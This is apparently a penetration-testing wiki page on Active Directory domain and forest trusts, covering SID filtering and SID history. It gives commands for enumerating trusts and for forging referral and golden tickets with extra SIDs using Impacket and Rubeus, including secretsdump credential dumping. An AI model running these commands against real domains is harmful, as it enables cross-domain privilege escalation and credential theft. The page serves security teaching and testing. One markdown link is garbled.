## Theory
### Forest, domains & trusts
An Active Directory domain is a collection of computers, users, and other resources that are all managed together. A domain has its own security database, which is used to authenticate users and computers when they log in or access resources within the domain.

A forest is a collection of one or more Active Directory domains that share a common schema, configuration, and global catalog. The schema defines the kinds of objects that can be created within the forest, and the global catalog is a centralized database that contains a searchable, partial replica of every domain in the forest.

Trust relationships between domains allow users in one domain to access resources in another domain. There are several types of trust relationships that can be established, including one-way trusts, two-way trusts, external trusts, etc

Once a trust relationship is established between a trusting domain (A) and trusted domain (B), users from the trusted domain can authenticate to the trusting domain's resources. In other -more technical- terms, trusts extend the security boundary of a domain or forest.
!!! note
    Simply establishing a trust relationship does not automatically grant access to resources. In order to access a "trusting" resource, a "trusted" user must have the appropriate permissions to that resource. These permissions can be granted by adding the user to a group that has access to the resource, or by giving the user explicit permissions to the resource.

    A trust relationship allows users in one domain to authenticate to the other domain's resources, but it does not automatically grant access to them. Access to resources is controlled by permissions, which must be granted explicitly to the user in order for them to access the resources.

### Global catalog
The global catalog is a partial copy of all objects in an Active Directory forest, meaning that some object properties (but not all) are contained within it. This data is replicated among all domain controllers marked as global catalogs for the forest. One of the Global Catalog's purposes is to facilitate quick object searching and conflict resolution without the necessity of referring to other domains

The initial global catalog is generated on the first domain controller created in the first domain in the forest. The first domain controller for each new child domain is also set as a global catalog by default, but others can be added.

The GC allows both users and applications to find information about any objects in ANY domain in the forest. The Global Catalog performs the following functions:

- Authentication (provided authorization for all groups that a user account belongs to, which is included when an access token is generated)
- Object search (making the directory structure within a forest transparent, allowing a search to be carried out across all domains in a forest by providing just one attribute about an object.)

### SID filtering
According to Microsoft, the security boundary in Active Directory is the forest, not the domain. The forest defines the boundaries of trust and controls access to resources within the forest.

The domain is a unit within a forest and represents a logical grouping of users, computers, and other resources. Users within a domain can access resources within their own domain and can also access resources in other domains within the same forest, as long as they have the appropriate permissions. Users cannot access resources in other forests unless a trust relationship has been established between the forests.

SID filtering plays an important role in the security boundary by making sure "only SIDs from the trusted domain will be accepted for authorization data returned during authentication. SIDs from other domains will be removed".By default, SID filtering is disabled for intra-forest trusts, and enabled for inter-forest trusts

### SID History
The SID (Security Identifier) is a unique identifier that is assigned to each security principal (e.g. user, group, computer). It is used to identify the principal within the domain and is used to control access to resources.

The SID history is a property of a user or group object that allows the object to retain its SID when it is migrated from one domain to another as part of a domain consolidation or restructuring. When an object is migrated to a new domain, it is assigned a new SID in the target domain. The SID history allows the object to retain its original SID, so that access to resources in the source domain is not lost.

Many resources across the Internet, including Microsoft's docs and tools, state that SID history can be enabled across a trust. This is not 100% true. SID history is not a feature that can be toggled on or off per say.
## Exploit
### Enum
=== "UNIX-like"
    From UNIX-like systems, tools like [ldeep](From UNIX-like systems, tools like ldeep (Python), [ldapdomaindump](https://github.com/dirkjanm/ldapdomaindump) (Python), [ldapsearch-ad](https://github.com/yaap7/ldapsearch-ad) (Python) and ldapsearch (C) can be used to enumerate trusts.) (Python), ldapdomaindump (Python), ldapsearch-ad (Python) and [ldapsearch](https://git.openldap.org/openldap/openldap) (C) can be used to enumerate trusts.
    ```bash
    # ldeep supports cleartext, pass-the-hash, pass-the-ticket, etc.
    ldeep ldap -u "$USER" -p "$PASSWORD" -d "$DOMAIN" -s ldap://"$DC_IP" trusts

    # ldapdomaindump will store HTML, JSON and Greppable output
    ldapdomaindump --user 'DOMAIN\USER' --password "$PASSWORD" --outdir "ldapdomaindump" "$DC_HOST"

    # ldapsearch-ad
    ldapsearch-ad --server "$DC_HOST" --domain "$DOMAIN" --username "$USER" --password "$PASSWORD" --type trusts

    # ldapsearch
    ldapsearch -h ldap://"$DC_IP" -b "CN=SYSTEM,DC=$DOMAIN" "(objectclass=trustedDomain)"
    ```
    BloodHound can also be used to map the trusts. While it doesn't provide much details, it shows a visual representation.
=== "Windows"
    From `domain-joined` hosts, the netdom cmdlet can be used.
    ```bash
    netdom trust /domain:DOMAIN.LOCAL
    ```
    Alternatively, PowerSploit's PowerView (PowerShell) supports multiple commands for various purposes.

    | Command                         | Alias                  | Description                                                                                   |
    |---------------------------------|------------------------|-----------------------------------------------------------------------------------------------|
    | `Get-DomainTrust`              | `Get-NetDomainTrust`   | Gets all trusts for the current user's domain                                                 |
    | `Get-ForestTrust`              | `Get-NetForestTrust`   | Gets all trusts for the forest associated with the current user's domain                      |
    | `Get-DomainForeignUser`        | `Find-ForeignUser`     | Enumerates users who are in groups outside of their principal domain                          |
    | `Get-DomainForeignGroupMember` | `Find-ForeignGroup`    | Enumerates all the members of a domain's groups and finds users that are outside the domain   |
    | `Get-DomainTrustMapping`       | `Invoke-MapDomainTrust`| Tries to build a relational mapping of all domain trusts                                       |

    ```bash
    Get-DomainTrust -SearchBase "GC://$($ENV:USERDNSDOMAIN)"
    ```
### Forging tickets
When authenticating across trusts, an attacker can forge either:

- A referral ticket (inter-realm TGT) using the inter-realm trust key
- A golden ticket using the compromised domain's krbtgt hash
#### Referral ticket
When forging a referral ticket, a service ticket request must be conducted before trying to access the domain controller. The referral ticket is encrypted with the inter-realm key shared between the two domains.
=== "UNIX-like"
    From UNIX-like systems, Impacket scripts (Python) can be used:
    ```bash
    # 1. forge the referral ticket
    ticketer.py -nthash "inter-realm key" -domain-sid "compromised_domain_SID" -domain "compromised_domain_FQDN" -extra-sid "<target_domain_SID>-<RID>" -spn "krbtgt/target_domain_fqdn" "someusername"

    # 2. use it to request a service ticket
    KRB5CCNAME="someusername.ccache" getST.py -k -no-pass -debug -spn "CIFS/domain_controller" "target_domain_fqdn/someusername@target_domain_fqdn"
    ```
#### Golden ticket
When forging a golden ticket, the target domain controller will handle the service ticket generation itself. The golden ticket is encrypted with the compromised domain's krbtgt hash.
=== "UNIX-like"
    ```bash
    # Generate golden ticket with extra SID
    ticketer.py -nthash "compromised_domain_krbtgt_NT_hash" -domain-sid "compromised_domain_SID" -domain "compromised_domain_FQDN" -extra-sid "<target_domain_SID>-<RID>" "someusername"

    # The ticket can be used directly with any tool supporting Kerberos auth
    KRB5CCNAME="someusername.ccache" secretsdump.py -k -no-pass "target_domain_fqdn/someusername@domain_controller"
    ```
    Impacket's raiseChild.py script can also be used to conduct the golden ticket technique automatically when SID filtering is disabled:
    ```bash
    raiseChild.py "compromised_domain"/"compromised_domain_admin":"$PASSWORD"
    ```
=== "Windows"
    ```bash
    # Generate golden ticket with extra SID and use Pass-the-Ticket
    Rubeus.exe golden /user:Administrator /domain:<compromised_domain_FQDN> /sid:<compromised_domain_SID> /sids:<target_domain_SID>-<RID> /krbtgt:<compromised_domain_krbtgt_NT_hash> /ptt

    # The ticket can be used directly with any tool supporting Kerberos auth
    ```
